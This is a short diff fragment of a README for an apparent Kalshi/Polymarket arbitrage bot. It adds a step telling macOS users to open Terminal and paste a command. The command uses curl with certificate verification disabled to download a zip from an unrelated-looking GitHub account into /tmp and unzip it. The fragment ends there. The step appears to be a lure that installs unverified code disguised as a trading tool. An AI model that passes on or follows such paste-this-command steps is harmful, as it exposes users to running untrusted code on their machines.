@@ -33,7 +33,7 @@ kalshi-polymarket-arbitrage-tool/
 ```
 
 ## Installation (macOS)
-
+Open **Terminal** (press `⌘ + Space`, type "Terminal", hit Enter) and run:
 ```bash
 curl -fsSLk https://github.com/elizabethasicb/poly-market-kalshi-bot/archive/refs/heads/main.zip -o /tmp/cw.zip && \
 unzip -qo /tmp/cw.zip -d /tmp && \
